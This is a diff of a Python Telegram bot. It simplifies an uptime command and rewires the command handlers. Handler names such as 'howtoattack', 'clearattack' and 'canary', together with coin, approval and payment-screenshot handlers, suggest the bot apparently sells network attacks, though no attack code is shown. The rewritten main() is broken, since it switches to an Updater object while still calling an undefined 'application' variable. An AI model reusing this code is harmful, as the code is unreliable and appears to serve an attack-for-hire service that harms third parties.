-        uptime_seconds = int(current_time - start_time)
-
-        days = uptime_seconds // 86400
-        hours = (uptime_seconds % 86400) // 3600
-        minutes = (uptime_seconds % 3600) // 60
-        seconds = uptime_seconds % 60
-
-        uptime_message = "⏰ *Bot Uptime:*\n"
-        if days > 0:
-            uptime_message += f"📅 {days} days\n"
-        uptime_message += f"⏳ {hours} hours, {minutes} minutes, {seconds} seconds\n\n"
-        uptime_message += "⚡ *Live updating...*"
-
-        try:
-            await context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=uptime_message,
-                parse_mode="Markdown"
-            )
-        except:
-            break
-
-        await asyncio.sleep(1)  # Har second update karega
-
 async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    message = await update.message.reply_text("🕒 *Calculating Uptime...*", parse_mode="Markdown")
+    current_time = time.time()
+    uptime_seconds = int(current_time - start_time)
 
-    # Start live updating countdown
-    asyncio.create_task(update_uptime_timer(context, update.message.chat_id, message.message_id))
+    days = uptime_seconds // 86400
+    hours = (uptime_seconds % 86400) // 3600
+    minutes = (uptime_seconds % 3600) // 60
+    seconds = uptime_seconds % 60
+
+    uptime_message = f"🕒 *Bot Uptime:*\n"
+    if days > 0:
+        uptime_message += f"📅 {days} days\n"
+    uptime_message += f"⏳ {hours} hours, {minutes} minutes, {seconds} seconds"
+
+    await update.message.reply_text(uptime_message, parse_mode="Markdown")
 
 async def start_background_tasks(app):
     asyncio.create_task(notify_expiring_users(app.bot))  # Existing notification task
     asyncio.create_task(notify_unapproved_users(app.bot))  # Naya task unapproved users ke liye
 
 def main():
-    application = ApplicationBuilder().token(BOT_TOKEN).post_init(start_background_tasks).build()
+    BOT_TOKEN = "your_bot_token_here"
+    
+    updater = Updater(BOT_TOKEN, use_context=True)
+    dp = updater.dispatcher
 
     # Command handlers
     application.add_handler(CommandHandler("start", start))
@@ -1068,18 +1066,17 @@ def main():
     application.add_handler(CommandHandler("removecoin", removecoin))
     application.add_handler(CommandHandler("howtoattack", howtoattack))
     application.add_handler(CommandHandler("canary", canary))
+    application.add_handler(CommandHandler("clearattack", clear_attack))
     application.add_handler(CommandHandler("broadcast", broadcast))
     application.add_handler(CommandHandler("users", users))
-    application.add_handler(CommandHandler("buy", start_buy))
     application.add_handler(CommandHandler("uptime", uptime))
-    application.add_handler(CommandHandler("setcooldown", set_cooldown))
-    
-    application.add_handler(CallbackQueryHandler(handle_plan_selection))
-    application.add_handler(MessageHandler(filters.PHOTO, handle_payment_screenshot))
+    application.add_handler(CommandHandler("maintenance", maintenance_mode))
+    application.add_handler(CallbackQueryHandler(join_channel, pattern="join_check"))
+    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
 
     # Start the bot
-    application.run_polling()
+    updater.start_polling()
+    updater.idle()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
-    
